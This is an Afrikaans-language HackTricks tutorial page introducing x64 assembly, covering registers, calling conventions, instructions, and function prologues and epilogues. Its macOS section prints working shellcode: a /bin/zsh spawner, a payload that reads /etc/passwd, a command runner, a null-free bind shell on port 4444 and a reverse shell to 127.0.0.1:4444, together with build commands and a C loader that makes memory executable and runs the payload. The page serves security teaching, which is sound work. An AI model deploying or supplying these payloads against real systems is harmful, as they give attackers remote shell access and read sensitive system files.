# Inleiding tot x64

{{#include ../../../banners/hacktricks-training.md}}

## **Inleiding tot x64**

x64, ook bekend as x86-64, is 'n 64-bis verwerkerargitektuur wat hoofsaaklik in rekenaar- en bedienerverwerking gebruik word. Dit het uit die x86-argitektuur ontstaan, wat deur Intel vervaardig en later deur AMD aangeneem is onder die naam AMD64. Dit is vandag die algemeenste argitektuur in persoonlike rekenaars en bedieners.

### **Registers**

x64 brei voort op die x86-argitektuur en beskik oor **16 algemene-doel-registers** met die name `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, en `r8` tot `r15`. Elkeen hiervan kan 'n **64-bis** (8-grepe) waarde stoor. Hierdie registers het ook 32-bis-, 16-bis- en 8-bis-subregisters vir versoenbaarheid en spesifieke take.

1. **`rax`** - Tradisioneel gebruik vir **terugkeerwaardes** van funksies.
2. **`rbx`** - Word dikwels as 'n **basisregister** vir geheuebewerkings gebruik.
3. **`rcx`** - Word algemeen vir **lus-tellers** gebruik.
4. **`rdx`** - Word in verskeie rolle gebruik, insluitend uitgebreide rekenkundige bewerkings.
5. **`rbp`** - **Basiswyser** vir die stack-raamwerk.
6. **`rsp`** - **Stack-wyser**, wat die bokant van die stack dophou.
7. **`rsi`** en **`rdi`** - Word vir **bron**- en **bestemming**-indekse in string-/geheuebewerkings gebruik.
8. **`r8`** tot **`r15`** - Bykomende algemene-doel-registers wat in x64 bekendgestel is.

### **Aanroepkonvensie**

Die x64-aanroepkonvensie verskil tussen bedryfstelsels. Byvoorbeeld:

- **Windows**: Die eerste **vier parameters** word in die registers **`rcx`**, **`rdx`**, **`r8`**, en **`r9`** deurgegee. Verdere parameters word op die stack geplaas. Die terugkeerwaarde is in **`rax`**.
- **System V (algemeen gebruik in UNIX-agtige stelsels)**: Die eerste **ses heelgetal- of wyserparameters** word in die registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, en **`r9`** deurgegee. Die terugkeerwaarde is ook in **`rax`**.

As die funksie meer as ses invoere het, sal die **res op die stack deurgegee word**. **RSP**, die stack-wyser, moet **16 grepe belyn** wees, wat beteken dat die adres waarna dit wys, deur 16 deelbaar moet wees voordat enige call plaasvind. Dit beteken dat ons normaalweg moet verseker dat RSP behoorlik in ons shellcode belyn is voordat ons 'n funksie-call maak. In die praktyk werk system calls egter dikwels selfs wanneer daar nie aan hierdie vereiste voldoen word nie.

### Aanroepkonvensie in Swift

Swift het sy eie **aanroepkonvensie**, wat gevind kan word by [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Algemene Instruksies**

x64-instruksies het 'n uitgebreide stel, wat versoenbaarheid met vroeëre x86-instruksies behou en nuwes bekendstel.

- **`mov`**: **Beweeg** 'n waarde van een **register** of **geheue-ligging** na 'n ander.
- Voorbeeld: `mov rax, rbx` — Beweeg die waarde van `rbx` na `rax`.
- **`push`** en **`pop`**: Plaas waardes op die **stack** of verwyder dit daarvan.
- Voorbeeld: `push rax` — Plaas die waarde in `rax` op die stack.
- Voorbeeld: `pop rax` — Verwyder die boonste waarde van die stack en plaas dit in `rax`.
- **`add`** en **`sub`**: **Optellings-** en **aftrekkingsbewerkings**.
- Voorbeeld: `add rax, rcx` — Tel die waardes in `rax` en `rcx` bymekaar en stoor die resultaat in `rax`.
- **`mul`** en **`div`**: **Vermenigvuldigings-** en **delingsbewerkings**. Let wel: hierdie het spesifieke gedrag rakende operandgebruik.
- **`call`** en **`ret`**: Word gebruik om **funksies aan te roep** en **daaruit terug te keer**.
- **`int`**: Word gebruik om 'n sagteware-**interrupt** te aktiveer. Bv. is `int 0x80` vir system calls in 32-bis x86 Linux gebruik.
- **`cmp`**: **Vergelyk** twee waardes en stel die CPU se flags op grond van die resultaat.
- Voorbeeld: `cmp rax, rdx` — Vergelyk `rax` met `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: **Voorwaardelike sprong**-instruksies wat die control flow verander op grond van die resultate van 'n vorige `cmp` of test.
- Voorbeeld: Ná 'n `cmp rax, rdx`-instruksie, `je label` — Spring na `label` as `rax` gelyk is aan `rdx`.
- **`syscall`**: Word vir **system calls** in sommige x64-stelsels gebruik (soos moderne Unix).
- **`sysenter`**: 'n Geoptimaliseerde **system call**-instruksie op sommige platforms.

### **Funksieproloog**

1. **Push die ou basiswyser**: `push rbp` (stoor die caller se basiswyser)
2. **Beweeg die huidige stack-wyser na die basiswyser**: `mov rbp, rsp` (stel die nuwe basiswyser vir die huidige funksie op)
3. **Ken spasie op die stack toe vir plaaslike veranderlikes**: `sub rsp, <size>` (waar `<size>` die aantal nodige grepe is)

### **Funksie-epiloog**

1. **Beweeg die huidige basiswyser na die stack-wyser**: `mov rsp, rbp` (deallokeer plaaslike veranderlikes)
2. **Pop die ou basiswyser van die stack af**: `pop rbp` (herstel die caller se basiswyser)
3. **Keer terug**: `ret` (gee beheer aan die caller terug)

## macOS

### syscalls

Daar is verskillende klasse syscalls; jy kan hulle [**hier vind**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Dan kan jy elke syscall-nommer [**in hierdie URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Dus, om die `open` syscall van die **Unix/BSD-klas** aan te roep, moet jy dit byvoeg: `0x2000000`

Die syscall-nommer om open aan te roep, sou dus `0x2000005` wees

### Shellcodes

Om te compileer:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Om die grepe te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>C-kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem van [**hier**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) ’n array van params (wat in die geheue ’n stack van die adresse beteken).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Invoke command met sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell vanaf [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) op **poort 4444**<sup>[[2]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell vanaf [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell na **127.0.0.1:4444**<sup>[[3]](#references)</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Verwysings

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
